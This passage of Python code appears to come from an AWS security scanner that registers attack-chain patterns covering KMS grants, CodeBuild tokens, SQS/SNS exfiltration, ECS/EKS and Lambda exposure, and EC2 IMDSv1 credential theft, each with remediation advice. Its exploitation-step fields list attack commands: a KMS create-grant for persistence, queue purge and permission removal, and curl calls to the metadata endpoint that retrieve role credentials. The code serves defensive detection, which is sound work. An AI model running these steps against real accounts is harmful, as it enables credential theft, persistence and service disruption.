        "Maintains persistent decrypt/data-key capability without modifying key policy",
    ]


def _kms_grant_persistence_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Remove or tightly constrain CreateGrant delegation in grants",
        "Enforce grant constraints (encryption context, service scoping)",
        "Continuously review and alert on anomalous grant creation patterns",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="kms_grant_persistence_chain",
        name="KMS Grant Persistence Chain",
        description="Unconstrained CreateGrant delegation can provide durable and stealthy key access persistence.",
        severity="High",
        skills_required=["kms"],
        matcher=_match_kms_grant_persistence,
        attack_path_generator=_kms_grant_persistence_attack_path,
        remediation_generator=_kms_grant_persistence_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0003", "TA0005"],
            mitre_attack_techniques=["T1098"],
            observed_in_wild=True,
            exploit_maturity="Proof-of-Concept",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "aws kms list-grants --key-id <key-id>",
                "aws kms create-grant --key-id <key-id> --grantee-principal <principal-arn> --operations CreateGrant Decrypt",
                "aws kms list-grants --key-id <key-id>",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Medium",
            estimated_time_to_compromise="45 minutes",
        ),
        amplification_factor=1.5,
    )
)


def _match_cicd_plus_overpriv_iam(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    # CICD token leakage conditions
    if not _match_cicd_codebuild_token_leakage(
        findings_by_skill, resource_index, evidence_by_skill
    ):
        return False

    iam_findings = findings_by_skill.get("iam", [])
    return any(_is_overprivileged_iam_finding(f) for f in iam_findings)


def _cicd_overpriv_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker compromises CI/CD token or build configuration",
        "Obtains AWS credentials or pivots to AWS via build role",
        "Abuses over-privileged IAM permissions for account-wide lateral movement",
        "Establishes persistence through IAM role trust/policy changes",
    ]


def _cicd_overpriv_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Harden CodeBuild projects (no insecureSsl/proxy injection) and remove unused creds",
        "Restrict who can start builds and update projects; use approval gates",
        "Reduce IAM privileges of build roles and apply permission boundaries",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="cicd_iam_token_leakage_privilege_escalation",
        name="CI/CD Token Leakage + IAM Escalation Chain",
        description="CI/CD token leakage combined with overprivileged IAM enables rapid account takeover.",
        severity="Critical",
        skills_required=["cicd", "iam"],
        matcher=_match_cicd_plus_overpriv_iam,
        attack_path_generator=_cicd_overpriv_attack_path,
        remediation_generator=_cicd_overpriv_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0006", "TA0004", "TA0008"],
            mitre_attack_techniques=["T1552.001", "T1078.004", "T1098"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "aws codebuild list-source-credentials",
                "Enumerate build roles and permissions",
                "Validate IAM wildcard actions and sensitive API access",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="High",
            estimated_time_to_compromise="2 hours",
        ),
        amplification_factor=1.7,
    )
)


def _match_messaging_plus_iam_admin(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    if not _match_messaging_dlq_exfil(findings_by_skill, resource_index, evidence_by_skill):
        return False

    iam_findings = findings_by_skill.get("iam", [])
    # Reuse overpriv heuristic; in practice this catches admin-ish findings.
    return any(_is_overprivileged_iam_finding(f) for f in iam_findings)


def _messaging_iam_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker obtains IAM rights to modify SQS queue attributes/policies",
        "Reconfigures DLQ/redrive to route messages to attacker-controlled queue",
        "Moves/re-drives messages to exfiltrate data and conceal theft",
        "Uses administrative IAM access to expand to other services",
    ]


def _messaging_iam_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Restrict IAM permissions for SQS administrative actions (SetQueueAttributes, AddPermission)",
        "Harden queue policies and redrive allow policies",
        "Enable monitoring/alerts on SQS policy/attribute changes",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="messaging_iam_dlq_exfiltration_chain",
        name="SQS DLQ Exfiltration + IAM Admin Chain",
        description="SQS redrive configuration plus overprivileged IAM enables stealthy message exfiltration at scale.",
        severity="Critical",
        skills_required=["messaging", "iam"],
        matcher=_match_messaging_plus_iam_admin,
        attack_path_generator=_messaging_iam_attack_path,
        remediation_generator=_messaging_iam_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0010", "TA0004"],
            mitre_attack_techniques=["T1020", "T1078.004"],
            observed_in_wild=False,
            exploit_maturity="Proof-of-Concept",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "aws sqs get-queue-attributes --attribute-names Policy RedrivePolicy RedriveAllowPolicy",
                "aws iam get-role --role-name <role>",
                "Review CloudTrail for SetQueueAttributes events",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="High",
            estimated_time_to_compromise="2 hours",
        ),
        amplification_factor=1.6,
    )
)


def _match_kms_plus_iam_admin(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    if not _match_kms_policy_backdoor(findings_by_skill, resource_index, evidence_by_skill):
        return False
    iam_findings = findings_by_skill.get("iam", [])
    return any(_is_overprivileged_iam_finding(f) for f in iam_findings)


def _kms_iam_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker identifies permissive KMS key policies",
        "Obtains/abuses IAM permissions to enumerate and use CMKs",
        "Decrypts protected secrets/data keys and exfiltrates sensitive data",
        "Expands to broader AWS access using recovered secrets",
    ]


def _kms_iam_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Restrict KMS key policies and administrative IAM permissions",
        "Audit and remove wildcard principals; rotate affected keys/secrets",
        "Monitor KMS Decrypt/GenerateDataKey usage and alert on anomalies",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="kms_iam_policy_backdoor_escalation_chain",
        name="KMS Policy Backdoor + IAM Escalation Chain",
        description="Permissive KMS policies combined with overprivileged IAM enable decrypt-based exfiltration and escalation.",
        severity="Critical",
        skills_required=["kms", "iam"],
        matcher=_match_kms_plus_iam_admin,
        attack_path_generator=_kms_iam_attack_path,
        remediation_generator=_kms_iam_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0006", "TA0010", "TA0004"],
            mitre_attack_techniques=["T1552.001", "T1020", "T1078.004"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "aws kms get-key-policy --key-id <key>",
                "aws iam list-attached-role-policies --role-name <role>",
                "Search CloudTrail for KMS Decrypt events",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="High",
            estimated_time_to_compromise="2 hours",
        ),
        amplification_factor=1.7,
    )
)


def _match_cicd_codebuild_token_leakage(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    cicd = evidence_by_skill.get("cicd", {}) if isinstance(evidence_by_skill, dict) else {}

    creds_doc = cicd.get("codebuild-source-credentials") or {}
    if not isinstance(creds_doc, dict):
        creds_doc = {}
    creds = creds_doc.get("items", [])
    if isinstance(creds, list) and len(creds) > 0:
        return True

    proj_doc = cicd.get("codebuild-projects") or {}
    if not isinstance(proj_doc, dict):
        proj_doc = {}
    projects = proj_doc.get("items", [])
    if not isinstance(projects, list):
        return False

    for p in projects:
        if not isinstance(p, dict):
            continue
        source = p.get("source") if isinstance(p.get("source"), dict) else {}
        if not isinstance(source, dict):
            source = {}
        if bool(source.get("insecureSsl")):
            return True
        env = p.get("environment") if isinstance(p.get("environment"), dict) else {}
        if not isinstance(env, dict):
            env = {}
        evs = env.get("environmentVariables")
        if not isinstance(evs, list):
            evs = []
        if any(isinstance(ev, dict) and ev.get("looks_like_proxy") for ev in evs):
            return True
    return False


def _cicd_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker gains access to CodeBuild project configuration or build execution",
        "Harvests source credentials metadata and identifies token-based integrations",
        "Abuses insecure SSL/proxy paths to intercept repository credentials",
        "Uses leaked tokens for code access, supply-chain abuse, or lateral movement",
    ]


def _cicd_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Remove unused CodeBuild source credentials; prefer short-lived connections",
        "Disable insecureSsl and prevent proxy env var injection",
        "Restrict who can update projects and start builds; monitor for anomalies",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="cicd_codebuild_token_leakage_chain",
        name="CodeBuild Token Leakage Chain",
        description="CodeBuild source credentials or interception-friendly settings can enable token leakage and supply-chain compromise.",
        severity="High",
        skills_required=["cicd"],
        matcher=_match_cicd_codebuild_token_leakage,
        attack_path_generator=_cicd_attack_path,
        remediation_generator=_cicd_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0006", "TA0004"],
            mitre_attack_techniques=["T1552.001", "T1195"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "aws codebuild list-projects",
                "aws codebuild batch-get-projects --names <project>",
                "aws codebuild list-source-credentials",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Medium",
            estimated_time_to_compromise="60 minutes",
        ),
        amplification_factor=1.4,
    )
)


def _match_messaging_dlq_exfil(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    messaging = (
        evidence_by_skill.get("messaging", {}) if isinstance(evidence_by_skill, dict) else {}
    )
    queues_doc = messaging.get("sqs-queues") or {}
    if not isinstance(queues_doc, dict):
        return False
    queues = queues_doc.get("items", [])
    if not isinstance(queues, list):
        return False

    for q in queues:
        if not isinstance(q, dict):
            continue
        if q.get("RedrivePolicy") or q.get("RedriveAllowPolicy"):
            # Redrive present; if policy is permissive, treat as exfil risk.
            pol = q.get("Policy")
            if isinstance(pol, dict) and _policy_has_wildcard_principal(pol):
                return True
            # Even without wildcard, redrive itself is worth flagging as chain candidate.
            return True
    return False


def _messaging_dlq_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker obtains SQS administrative capability (SetQueueAttributes/Redrive configuration)",
        "Modifies DLQ/redrive settings to route messages to attacker-controlled queue",
        "Moves or re-drives messages to exfiltrate accumulated sensitive payloads",
    ]


def _messaging_dlq_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Restrict SQS administrative actions and queue policy principals",
        "Review DLQ/redrive configuration and redrive allow policies",
        "Monitor CloudTrail for SetQueueAttributes and message move operations",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="messaging_sqs_dlq_exfiltration_chain",
        name="SQS DLQ Exfiltration Chain",
        description="Redrive/DLQ configuration can be abused to siphon messages for data exfiltration.",
        severity="High",
        skills_required=["messaging"],
        matcher=_match_messaging_dlq_exfil,
        attack_path_generator=_messaging_dlq_attack_path,
        remediation_generator=_messaging_dlq_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0010"],
            mitre_attack_techniques=["T1020"],
            observed_in_wild=False,
            exploit_maturity="Proof-of-Concept",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "aws sqs list-queues",
                "aws sqs get-queue-attributes --attribute-names RedrivePolicy RedriveAllowPolicy Policy",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Medium",
            estimated_time_to_compromise="45 minutes",
        ),
        amplification_factor=1.35,
    )
)


def _match_messaging_sns_sqs_unauth_exfil(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    msg_findings = findings_by_skill.get("messaging", [])
    ids = {f.id for f in msg_findings}
    return bool({"MSG-005", "MSG-007", "MSG-008"}.intersection(ids))


def _messaging_sns_sqs_unauth_exfil_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker discovers permissive SNS topic and/or SQS queue policies",
        "Creates unauthorized subscription or injects/reads queue messages",
        "Exfiltrates message payloads and abuses trusted event workflows",
    ]


def _messaging_sns_sqs_unauth_exfil_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Eliminate wildcard principals on sns:Publish/sns:Subscribe and SQS data-plane actions",
        "Add strict SourceArn/SourceAccount conditions for service integrations",
        "Continuously monitor policy changes and subscription drift",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="messaging_sns_sqs_unauth_exfiltration_chain",
        name="SNS/SQS Unauthenticated Exfiltration Chain",
        description="Permissive SNS/SQS policies can enable unauthorized subscribe/publish/receive paths for data exfiltration.",
        severity="Critical",
        skills_required=["messaging"],
        matcher=_match_messaging_sns_sqs_unauth_exfil,
        attack_path_generator=_messaging_sns_sqs_unauth_exfil_attack_path,
        remediation_generator=_messaging_sns_sqs_unauth_exfil_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0009", "TA0010"],
            mitre_attack_techniques=["T1020", "T1557"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "aws sns list-topics && aws sns get-topic-attributes --topic-arn <arn>",
                "aws sqs list-queues && aws sqs get-queue-attributes --queue-url <url> --attribute-names Policy",
                "aws sns subscribe / aws sqs receive-message",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Low",
            estimated_time_to_compromise="25 minutes",
        ),
        amplification_factor=1.6,
    )
)


def _match_messaging_queue_destruction_disruption(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    msg_findings = findings_by_skill.get("messaging", [])
    iam_findings = findings_by_skill.get("iam", [])
    has_open_messaging = any(f.id in {"MSG-005", "MSG-008"} for f in msg_findings)
    has_destructive_iam = any(f.id in {"IAM-038", "IAM-039"} for f in iam_findings)
    return has_open_messaging and has_destructive_iam


def _messaging_queue_destruction_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker abuses broad messaging and IAM mutation/destruction permissions",
        "Deletes/purges queues or removes permissions to disrupt message-driven workloads",
        "Causes sustained delivery failures and service degradation",
    ]


def _messaging_queue_destruction_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Remove destructive queue/topic operations from non-emergency roles",
        "Harden messaging resource policies and lock down admin APIs",
        "Alert on queue purge/delete and policy-removal operations",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="messaging_queue_destruction_disruption_chain",
        name="Messaging Queue Destruction/Disruption Chain",
        description="Combined permissive messaging access and destructive IAM permissions can trigger high-impact service disruption.",
        severity="Critical",
        skills_required=["messaging", "iam"],
        matcher=_match_messaging_queue_destruction_disruption,
        attack_path_generator=_messaging_queue_destruction_attack_path,
        remediation_generator=_messaging_queue_destruction_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0040", "TA0005"],
            mitre_attack_techniques=["T1485", "T1562"],
            observed_in_wild=False,
            exploit_maturity="Proof-of-Concept",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "aws sqs purge-queue --queue-url <url>",
                "aws sqs remove-permission --queue-url <url> --label <label>",
                "aws sns remove-permission --topic-arn <arn> --label <label>",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Medium",
            estimated_time_to_compromise="35 minutes",
        ),
        amplification_factor=1.75,
    )
)


def _match_kms_policy_backdoor(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    kms = evidence_by_skill.get("kms", {}) if isinstance(evidence_by_skill, dict) else {}
    pol_doc = kms.get("kms-key-policies") or {}
    items = pol_doc.get("items", []) if isinstance(pol_doc, dict) else []
    if not isinstance(items, list):
        return False

    for it in items:
        if not isinstance(it, dict):
            continue
        policy = it.get("Policy")
        if isinstance(policy, dict) and _policy_has_wildcard_principal(policy):
            return True
    return False


def _kms_backdoor_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker identifies permissive KMS key policy (wildcard/cross-account principals)",
        "Uses allowed KMS operations to decrypt data keys or protected secrets",
        "Exfiltrates sensitive data encrypted under the compromised CMK",
    ]


def _kms_backdoor_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Restrict KMS key policies to explicit principals",
        "Add condition keys (aws:PrincipalArn/aws:SourceAccount) where applicable",
        "Review and rotate affected secrets/data and monitor KMS usage",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="kms_policy_backdoor_exfil_chain",
        name="KMS Policy Backdoor Exfiltration Chain",
        description="Permissive KMS key policies can enable stealthy decrypt/exfil paths.",
        severity="Critical",
        skills_required=["kms"],
        matcher=_match_kms_policy_backdoor,
        attack_path_generator=_kms_backdoor_attack_path,
        remediation_generator=_kms_backdoor_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0006", "TA0010"],
            mitre_attack_techniques=["T1552.001", "T1020"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "aws kms list-keys",
                "aws kms get-key-policy --key-id <key>",
                "aws kms list-grants --key-id <key>",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Low",
            estimated_time_to_compromise="30 minutes",
        ),
        amplification_factor=1.5,
    )
)


def _match_ecs_eventbridge_scheduled_tasks(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    compute = evidence_by_skill.get("compute", {}) if isinstance(evidence_by_skill, dict) else {}
    rules_doc = compute.get("eventbridge-rules") or {}
    rules = rules_doc.get("rules", []) if isinstance(rules_doc, dict) else []
    if not isinstance(rules, list):
        return False

    for r in rules:
        if not isinstance(r, dict):
            continue
        sched = r.get("ScheduleExpression")
        if not isinstance(sched, str) or not sched:
            continue
        targets = r.get("Targets")
        if not isinstance(targets, list):
            continue
        if any(
            isinstance(t, dict) and str(t.get("Arn", "")).startswith("arn:aws:ecs") for t in targets
        ):
            return True
    return False


def _ecs_scheduled_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker gains ability to create/modify EventBridge rules or ECS RunTask",
        "Adds scheduled rule targeting ECS task execution",
        "Maintains persistence by periodically re-launching unauthorized tasks",
        "Uses task role permissions for lateral movement or data access",
    ]


def _ecs_scheduled_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Restrict events:PutRule/events:PutTargets and ecs:RunTask permissions",
        "Review scheduled rules and targets; remove unauthorized schedules",
        "Enforce least privilege on task roles and monitor for unexpected task launches",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="compute_ecs_scheduled_task_persistence",
        name="ECS Scheduled Task Persistence",
        description="EventBridge schedules that trigger ECS tasks can be abused for persistence.",
        severity="High",
        skills_required=["compute"],
        matcher=_match_ecs_eventbridge_scheduled_tasks,
        attack_path_generator=_ecs_scheduled_attack_path,
        remediation_generator=_ecs_scheduled_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0003", "TA0005"],
            mitre_attack_techniques=["T1053.003", "T1569.002"],
            observed_in_wild=False,
            exploit_maturity="Proof-of-Concept",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "aws events list-rules",
                "aws events list-targets-by-rule --rule <name>",
                "aws ecs list-task-definitions --sort DESC",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Medium",
            estimated_time_to_compromise="60 minutes",
        ),
        amplification_factor=1.3,
    )
)


def _match_eks_public_endpoint(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    compute = evidence_by_skill.get("compute", {}) if isinstance(evidence_by_skill, dict) else {}
    eks_doc = compute.get("eks-inventory") or {}
    if not isinstance(eks_doc, dict):
        return False
    clusters = eks_doc.get("clusters", [])
    if not isinstance(clusters, list):
        return False
    for c in clusters:
        if not isinstance(c, dict):
            continue
        vpc_cfg = c.get("resourcesVpcConfig")
        if not isinstance(vpc_cfg, dict):
            vpc_cfg = {}
        endpoint_public = vpc_cfg.get("endpointPublicAccess") if isinstance(vpc_cfg, dict) else None
        if bool(endpoint_public):
            return True
    return False


def _eks_public_overpriv_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "EKS control plane endpoint is reachable from the internet",
        "Attacker obtains AWS credentials with EKS administrative access",
        "Uses kubectl/API access to enumerate workloads and secrets",
        "Escalates to cluster-wide persistence and lateral movement",
    ]


def _eks_public_overpriv_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Disable public endpoint or restrict publicAccessCidrs",
        "Enforce least privilege for eks:* and related IAM permissions",
        "Enable control-plane logs and monitor authentication/audit events",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="compute_eks_public_endpoint_risk",
        name="EKS Public Endpoint Attack Surface",
        description="Public EKS endpoints increase attack surface and amplify IAM credential abuse.",
        severity="High",
        skills_required=["compute"],
        matcher=_match_eks_public_endpoint,
        attack_path_generator=_eks_public_overpriv_attack_path,
        remediation_generator=_eks_public_overpriv_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0001", "TA0004", "TA0008"],
            mitre_attack_techniques=["T1190", "T1078.004", "T1613"],
            observed_in_wild=False,
            exploit_maturity="Proof-of-Concept",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "aws eks describe-cluster --name <cluster>",
                "aws eks update-kubeconfig --name <cluster>",
                "kubectl get pods -A",
            ],
            tools_required=["aws-cli", "kubectl"],
            exploitation_complexity="Medium",
            estimated_time_to_compromise="90 minutes",
        ),
        amplification_factor=1.35,
    )
)


def _match_compute_ec2_imdsv1_profile_chain(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    comp = evidence_by_skill.get("compute", {}) if isinstance(evidence_by_skill, dict) else {}
    ec2_doc = comp.get("ec2-inventory") or {}
    instances = ec2_doc.get("instances", []) if isinstance(ec2_doc, dict) else []
    if not isinstance(instances, list):
        return False
    for it in instances:
        if not isinstance(it, dict):
            continue
        md = it.get("MetadataOptions")
        md = md if isinstance(md, dict) else {}
        has_profile = isinstance(it.get("IamInstanceProfile"), dict) and bool(
            it.get("IamInstanceProfile")
        )
        imdsv1 = str(md.get("HttpTokens") or "optional").lower() != "required"
        if has_profile and imdsv1:
            return True
    return False


def _compute_ec2_imdsv1_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker gains SSRF or host-level foothold on EC2 workload",
        "Queries IMDSv1 endpoint and retrieves role credentials from metadata",
        "Uses temporary credentials for lateral movement and control-plane abuse",
    ]


def _compute_ec2_imdsv1_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Enforce IMDSv2 (HttpTokens=require) on all EC2 instances",
        "Reduce privileges on instance profile roles",
        "Continuously monitor metadata credential abuse indicators",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="compute_ec2_imdsv1_instance_profile_credential_theft",
        name="EC2 IMDSv1 Instance Profile Credential Theft",
        description="IMDSv1 with attached instance profiles increases risk of credential theft and pivoting.",
        severity="High",
        skills_required=["compute"],
        matcher=_match_compute_ec2_imdsv1_profile_chain,
        attack_path_generator=_compute_ec2_imdsv1_attack_path,
        remediation_generator=_compute_ec2_imdsv1_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0001", "TA0006", "TA0008"],
            mitre_attack_techniques=["T1190", "T1552.005", "T1078.004"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>",
                "aws sts get-caller-identity",
            ],
            tools_required=["curl", "aws-cli"],
            exploitation_complexity="Medium",
            estimated_time_to_compromise="30 minutes",
        ),
        amplification_factor=1.45,
    )
)


def _match_compute_lambda_public_url_overpriv_chain(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    comp = evidence_by_skill.get("compute", {}) if isinstance(evidence_by_skill, dict) else {}
    lmb_doc = comp.get("lambda-inventory") or {}
    funcs = lmb_doc.get("functions", []) if isinstance(lmb_doc, dict) else []
    if not isinstance(funcs, list):
        return False

    risky_tokens = ["administratoraccess", "admin", "poweruser", "fullaccess"]
    for fn in funcs:
        if not isinstance(fn, dict):
            continue
        if str(fn.get("AuthType") or "").upper() != "NONE":
            continue
        attached = fn.get("AttachedPolicies")
        if not isinstance(attached, list):
            continue
        for p in attached:
            if not isinstance(p, dict):
                continue
            pname = str(p.get("PolicyName") or "").lower()
            if any(tok in pname for tok in risky_tokens):
                return True
    return False


def _compute_lambda_public_url_overpriv_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker reaches unauthenticated Lambda Function URL",
        "Abuses vulnerable function path or runtime flaw",
        "Executes with over-privileged execution role to pivot across AWS resources",
    ]


def _compute_lambda_public_url_overpriv_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Disable unauthenticated Function URLs (AuthType=AWS_IAM)",
        "Constrain Lambda execution role permissions to least privilege",
        "Add request validation, WAF/API Gateway front-door controls, and runtime monitoring",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="compute_lambda_public_url_overprivileged_role_chain",
        name="Lambda Public URL + Overprivileged Role Chain",
        description="Unauthenticated Lambda URLs combined with broad execution-role permissions amplify compromise impact.",
        severity="Critical",
        skills_required=["compute"],
        matcher=_match_compute_lambda_public_url_overpriv_chain,
        attack_path_generator=_compute_lambda_public_url_overpriv_attack_path,
        remediation_generator=_compute_lambda_public_url_overpriv_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0001", "TA0004", "TA0008"],
            mitre_attack_techniques=["T1190", "T1078.004", "T1528"],
            observed_in_wild=False,
            exploit_maturity="Proof-of-Concept",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "Enumerate Lambda Function URLs with AuthType NONE",
                "Invoke endpoint with crafted payloads",
                "Use role credentials to enumerate and access internal resources",
            ],
            tools_required=["curl", "aws-cli"],
            exploitation_complexity="Medium",
            estimated_time_to_compromise="45 minutes",
        ),
        amplification_factor=1.7,
    )
)


def _match_exposure_plus_compute_overpriv(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    # Entry points
    exposure = evidence_by_skill.get("exposure", {}) if isinstance(evidence_by_skill, dict) else {}
    lambda_urls = exposure.get("lambda-function-urls") or {}
    api_stages = exposure.get("api-gateway-stages") or {}
    has_entry = False
    if isinstance(lambda_urls, dict):
        urls = lambda_urls.get("function_urls")
        if isinstance(urls, list) and any(isinstance(u, dict) and u.get("IsPublic") for u in urls):
            has_entry = True
    if isinstance(api_stages, dict):
        stages = api_stages.get("items")
        if isinstance(stages, list) and any(
            isinstance(s, dict) and s.get("InvokeUrl") for s in stages
        ):
            has_entry = True
    if not has_entry:
        return False

    # Overprivileged IAM findings (reuse heuristic)
    iam_findings = findings_by_skill.get("iam", [])
    if not any(_is_overprivileged_iam_finding(f) for f in iam_findings):
        return False

    # Compute presence (ECS tasks or EKS clusters)
    compute = evidence_by_skill.get("compute", {}) if isinstance(evidence_by_skill, dict) else {}
    ecs_doc = compute.get("ecs-inventory") or {}
    eks_doc = compute.get("eks-inventory") or {}
    has_compute = False
    if (
        isinstance(ecs_doc, dict)
        and isinstance(ecs_doc.get("services"), list)
        and ecs_doc.get("services")
    ):
        has_compute = True
    if (
        isinstance(eks_doc, dict)
        and isinstance(eks_doc.get("clusters"), list)
        and eks_doc.get("clusters")
    ):
        has_compute = True
    return has_compute


def _public_entry_compute_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker targets internet-facing application entrypoint",
        "Gains foothold and harvests workload credentials/tokens",
        "Abuses over-privileged IAM permissions to access compute control plane",
        "Moves laterally across ECS/EKS workloads and AWS resources",
    ]


def _public_entry_compute_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Restrict public entrypoints and enforce WAF + strong auth",
        "Lock down IAM permissions for workload identities",
        "Harden ECS/EKS configurations and enable comprehensive logging",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="exposure_iam_compute_entrypoint_chain",
        name="Public Entrypoint + IAM + Compute Lateral Movement",
        description="Public entrypoints combined with overprivileged IAM and compute surfaces amplify lateral movement.",
        severity="Critical",
        skills_required=["exposure", "iam", "compute"],
        matcher=_match_exposure_plus_compute_overpriv,
        attack_path_generator=_public_entry_compute_attack_path,
        remediation_generator=_public_entry_compute_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0001", "TA0004", "TA0008"],
            mitre_attack_techniques=["T1190", "T1078.004", "T1021"],
            observed_in_wild=False,
            exploit_maturity="Proof-of-Concept",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "Enumerate public endpoints and validate access controls",
                "Map workload identities and IAM permissions",
                "Enumerate ECS/EKS resources reachable with obtained credentials",
            ],
            tools_required=["aws-cli", "curl"],
            exploitation_complexity="High",
            estimated_time_to_compromise="3 hours",
        ),
        amplification_factor=1.6,
    )
)


